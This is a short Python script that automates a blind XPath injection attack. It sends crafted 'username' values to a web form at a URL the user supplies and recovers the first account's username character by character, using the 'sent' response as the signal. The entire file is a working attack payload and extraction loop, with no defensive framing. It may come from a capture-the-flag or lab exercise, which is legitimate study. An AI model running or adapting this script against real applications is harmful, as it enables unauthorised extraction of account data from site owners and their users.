import requests
from bs4 import BeautifulSoup
from string import ascii_lowercase as alc

# Convert input to integer
limit = int(input("What is the limit? "))
url = input("What is the URL? ")

base = 1

while base < limit:
    for i in alc:
        # Format the username string with the current base and character
        username = f"invalid' or substring(/accounts/acc[1]/username,{base},1)='{i}' and '1'='1"
        params = {'username': username, 'msg': 'hi'}
        response = requests.post(url, data=params)
        data = response.text

        # Check if "sent" is in the response text
        if "sent" in data:
            print(f"Got it! This payload worked: {username}")
            base += 1  # Increment base if the payload worked
            break  # Exit the for loop and continue with the next base
        else:
            print(f"Testing character '{i}' at position {base}...")
    # Ensure the loop condition is checked after each complete iteration
    if base >= limit:
        print("Reached the limit.")
        break
